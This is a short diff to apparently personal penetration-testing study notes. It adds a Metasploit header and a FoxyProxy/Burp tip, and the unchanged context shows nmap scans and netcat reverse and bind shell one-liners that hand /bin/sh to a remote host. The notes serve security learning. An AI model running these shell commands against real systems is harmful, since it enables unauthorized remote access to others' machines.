@@ -26,7 +26,7 @@ nmap -sS 192.168.88.128
 nmap -T4 -p- -A
 -p- - all ports  ( default is top 1000 ports) ;   -A - scan everything , version, OS, fingerprint
 
-### SMB
+### SMB (and metasploit workflow)
 
 msfconsole
 search smb 
@@ -43,3 +43,5 @@ nc 192.168.1.1 4444 -e /bin/sh        --->   nc -lvp 4444
 ### bind shell 
 nc 192.168.1.1 4444     ---->  nc -lvp 4444 -e /bin/sh
 
+### Foxyproxy productivity 
+use foxyproxy addon and add burpsuite settings to it. easy switching 
